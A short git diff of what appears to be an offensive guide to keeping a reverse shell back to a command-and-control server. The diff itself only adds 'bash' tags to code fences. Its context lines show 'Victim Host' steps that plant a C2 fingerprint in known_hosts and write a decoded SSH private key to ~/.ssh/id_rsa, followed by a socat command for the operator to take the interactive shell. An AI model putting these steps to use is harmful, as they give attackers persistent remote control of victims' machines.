@@ -13,7 +13,7 @@ Example Server (To be replaced with yours): `rj3.me`
 ### `socat`
 
 #### Victim Host
-```
+```bash
 # Setup machine to connect back to C2
 echo "|1|<C2 Host Fingerprint>" > ~/.ssh/known_hosts && chmod 0600 ~/.ssh/known_hosts
 RUN echo "<BASE64 SSH key>" | base64 -d > ~/.ssh/id_rsa
@@ -24,7 +24,7 @@ while true; do
 done
 ```
 #### Remote Host
-```
+```bash
 # Ensure that port 9996 is open
 socat file:`tty`,raw,echo=0 tcp:localhost:2203
 ```
